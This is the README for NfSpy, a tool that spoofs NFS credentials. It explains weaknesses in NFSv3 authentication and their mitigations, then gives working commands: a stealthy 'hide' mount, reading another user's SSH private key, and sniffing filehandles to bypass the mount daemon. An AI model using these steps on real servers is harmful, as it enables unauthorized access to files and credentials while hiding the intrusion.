NfSpy - an ID-spoofing NFS client
=================================
by [Daniel Miller](https://github.com/bonsaiviking)

NfSpy is a Python library for automating the falsification of NFS credentials when mounting an NFS
share. Included are two client programs:

* **nfspy** uses the Filesystem in Userspace (FUSE) library to mount an NFS
  share in Linux. This allows the use of any regular file-searching and
  manipulation programs like `grep` and `find` to explore the NFS export.

* **nfspysh** is a ftp-like interactive shell for exploring NFS exports. It does
  not require the FUSE library, so it can run on non-Linux platforms.

Vulnerability exploited
-----------------------

NFS before version 4 is reliant upon host trust relationships for
authentication. The NFS server trusts any client machines to authenticate users
and assign the same user IDs (UIDS) that the shared filesystem uses. This works
in NIS, NIS+, and LDAP domains, for instance, but only if you know the client
machine is not compromised, or faking its identity. This is because the only
authentication in the NFS protocol is the passing of the UID and GID (group
ID). There are a few things that can be done to enhance the security of NFS,
but many of them are incomplete solutions, and even with all three listed here,
it could still be possible to circumvent the security measures.

### Squash root

The server or the share ("export" in NFS lingo) can be configured root\_squash,
meaning that any requests that come in claiming to be UID or GID 0 (root) will
be treated like the nobody user, or equivalent on the system. This does not
prevent an attacker from spoofing any other UID/GID combo, but will protect the
most sensitive info and configs on the export.

### nfs\_portmon

Another setting that can be enabled is nfs\_portmon, which denies requests
coming from source ports outside of the 513-1024 range. Since only root can
(usually) allocate these ports, this prevents a regular user on a trusted
machine from writing and using their own NFS client that fakes UID/GID. It does
nothing to stop a rogue host, a user with su permissions, or a root-level
compromised machine from doing the same thing.

### Export restrictions

Shares/exports can be controlled so that only certain machines can access them.
These Access Control Lists can consist of:

* IP addresses (e.g. 192.168.1.34)
* IP prefixes (e.g. @192.168.1)
* hostnames (e.g. server1.mydom.nis)
* host lists (e.g. @trusted\_hosts)
* "everyone"

The best configuration would be to use a host list, since querying the nfs
daemon will just give the name of the list, not which addresses or names it
contains. Next in line would be IP addresses or hostnames, since those are more
difficult to spoof. IP prefixes and "everyone" are indications of insecurity,
since there is little or no restriction on what addresses can connect.

Using NfSpy
-----------

A list of options can be seen by running

    nfspy --help

### Example

There is an NFS server on 192.168.1.124.

    $ showmount -e 192.168.1.124
    Export list for 192.168.1.124:
    /home (everyone)

Mount up the share. Using sudo lets you bind to a privileged port, and the 
allow\_other option lets any user use the filesystem. The other new option here
is "hide", which immediately "unmounts" the share on the server, but keeps the 
filehandle it got. This hides your presence from anyone using showmount -a

    $ sudo nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt

Enjoy your newfound freedom!

    $ cd /mnt
    /mnt$ ls -l
    drwx------ 74 8888 200 4096 2011-03-03 09:55 smithj
    /mnt$ cd smithj
    /mnt/smithj$ cat .ssh/id.rsa
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: DES-EDE3-CBC,30AEB543E512CA19
    <snip>

To unmount, use fusermount:

    $ sudo fusermount -u /mnt

### Advanced example

There is an NFS server on 192.168.1.124. Portmap is blocked, so you can't get a list of shares, but you can sniff the network traffic.

    $ sudo tshark -n -i eth0 -T fields -e nfs.fhandle
    Running as user "root" and group "root". This could be dangerous.
    Capturing on eth0
    01:00:04:00:01:00:22:00:e5:03:d8:9d:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
    01:00:04:01:01:00:22:00:e5:03:d8:9d:07:00:22:00:15:83:74:d5:00:00:00:00:00:00:00:00:00:00:00:00
    01:00:04:01:01:00:22:00:e5:03:d8:9d:07:00:22:00:15:83:74:d5:00:00:00:00:00:00:00:00:00:00:00:00
    
    ^C3 packets captured

Now use the dirhandle and getroot mount options to avoid using the mount
daemon, and use the nfsport option to avoid using the portmapper, traversing
up the directory tree to the root of the export. 

    $ sudo nfspy -o rw,server=192.168.1.124:,nfsport=2049/udp,dirhandle=01:00:04:01:01:00:22:00:e5:03:d8:9d:07:00:22:00:15:83:74:d5:00:00:00:00:00:00:00:00:00:00:00:00,getroot mnt

Note that we didn't provide a path to mount, since all we know is the nfs
filehandle. For this to work, the handle must be to a directory, not a file,
and you have to work quickly or the handle will become stale.

The `tshark` program is part of the Wireshark project. The common `tcpdump`
program also has the ability to decode NFS filehandles with the `-u` option:

    sudo tcpdump -n -i eth1 -u -- port 2049
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
    11:16:38.041242 IP 192.168.1.5.3057978128 > 192.168.1.124.2049: 120 getattr fh[2070001:762001:0:7500c611:a04186e6:edccffaa:1a0a608e:a065:500859ff:762001:adebb708]

These filehandles are 4-byte colon-separated, so you'll have to pad them with zeros
on your own; NfSpy will just strip the colons out, which is incorrect.

Using nfspysh
-------------

`nfspysh` takes the same basic set of options in the same format as `nfspy`, so
the tutorial above should work fine. The list of commands can be seen with the
"help" command.

    $ sudo PYTHONPATH=. python scripts/nfspysh -o server=127.0.0.1:/home/miller/nfs
    nfspy@127.0.0.1:/home/miller/nfs:/> ls
    /:
    040775  1000  1000       4096 2013-04-13 23:20:37 .
    040775  1000  1000       4096 2013-04-13 23:20:37 ..
    040775  1000  1000       4096 2013-04-11 06:36:48 public
    040775  1000  1000       4096 2013-04-13 23:26:40 more
    040700     0  1000       4096 2013-04-11 06:39:12 secrets
    100666  1000  1000          5 2013-04-13 23:28:02 README.md
    120777  1000  1000         21 2013-04-13 13:00:24 nmap -> /usr/local/share/nmap
    nfspy@127.0.0.1:/home/miller/nfs:/more> help
    Known commands:
        cd
        chmod
        chown
        exit
        get
        help
        lcd
        lpwd
        ls
        mkdir
        mv
        put
        pwd
        rm
        rmdir
        umask
    nfspy@127.0.0.1:/home/miller/nfs:/more> help get
    get <filename> [<localname>]
    
            Retrieve <filename> and save to <localname>. If no <localname> is given,
            defaults to the basename of <filename> in the current local working directory.
    nfspy@127.0.0.1:/home/miller/nfs:/more> exit
    Quitting.

BUGS
----

* Write access is beta. It has worked in my tests on a handful of systems,
  but could use more testing. Because of this, NfSpy defaults to mounting
  ro. Specify the rw mount option to change this.
  (nfspysh does not have a read-only mode. Tread carefully!)

* NfSpy does not work with the standard lockd and statd services, which could
  cause problems with writing to files. For read-only, though, and most
  nefarious uses for which it was intended, this shouldn't be a problem.

* NfSpy only supports NFSv3 at the moment. Future versions may intelligently
  choose a NFS version.
